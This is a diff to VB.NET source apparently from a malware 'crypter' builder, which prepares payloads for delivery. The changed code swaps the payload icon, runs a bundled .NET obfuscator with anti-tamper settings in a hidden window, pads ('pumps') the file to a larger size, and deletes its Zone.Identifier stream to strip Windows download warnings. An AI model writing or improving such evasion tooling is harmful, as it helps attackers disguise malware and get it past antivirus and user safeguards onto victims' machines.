@@ -38,22 +38,12 @@ Public Class Codedom
 
                 If Main.chkIcon.Checked = True AndAlso Main.picIcon.ImageLocation <> "" Then
                     Main.txtLog.AppendText("Changing Icon..." + Environment.NewLine)
-                    IconInjector.InjectIcon(Main.OutputPayload, Main.picIcon.ImageLocation)
-                End If
-
-                If Main.chkPump.Checked = True Then
-                    Main.txtLog.AppendText("Pumping..." + Environment.NewLine)
-                    Helper.Pumper(Main.OutputPayload)
-                End If
-
-                If Main.chkZoneIden.Checked = True Then
-                    Main.txtLog.AppendText("Deleting Zone-Identifier..." + Environment.NewLine)
-                    Helper.DeleteZoneIdentifier(Main.OutputPayload)
+                    IconInjector.InjectIcon(Path, Main.picIcon.ImageLocation)
                 End If
 
                 IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", My.Resources.dotNET_Reactor1)
                 Dim Info As ProcessStartInfo = New ProcessStartInfo()
-                Info.Arguments = "/C dotNET_Reactor.exe -file """ & Main.OutputPayload & """ -antitamp 1  -obfuscation 1 -antitamp  1 -targetfile """ & Main.OutputPayload & """"
+                Info.Arguments = "/C dotNET_Reactor.exe -file """ & Path & """ -antitamp 1  -obfuscation 1 -antitamp  1 -targetfile """ & Path & """"
                 Info.WindowStyle = ProcessWindowStyle.Hidden
                 Info.CreateNoWindow = True
                 Info.WorkingDirectory = IO.Path.GetTempPath
@@ -61,7 +51,19 @@ Public Class Codedom
                 Process.Start(Info)
 
                 Threading.Thread.Sleep(2500)
-                Dim PayloadSize As New IO.FileInfo(Main.OutputPayload)
+
+                If Main.chkPump.Checked = True Then
+                    Main.txtLog.AppendText("Pumping..." + Environment.NewLine)
+                    Helper.Pumper(Path)
+                End If
+
+                If Main.chkZoneIden.Checked = True Then
+                    Main.txtLog.AppendText("Deleting Zone-Identifier..." + Environment.NewLine)
+                    Helper.DeleteZoneIdentifier(Path)
+                End If
+
+                Threading.Thread.Sleep(2500)
+                Dim PayloadSize As New IO.FileInfo(Path)
                 Dim sizeInBytes As Long = PayloadSize.Length / 1024
                 Main.txtLog.AppendText("Done! Crypted file final size is " + sizeInBytes.ToString + " KB" + Environment.NewLine)
             End If
@@ -69,7 +71,7 @@ Public Class Codedom
 
         Try
             IO.File.Delete(IO.Path.GetTempPath + "\" + Main.ResName + ".Resources")
-            IO.File.Delete(Main.OutputPayload + ".hash")
+            IO.File.Delete(Path + ".hash")
         Catch ex As Exception
         End Try
 
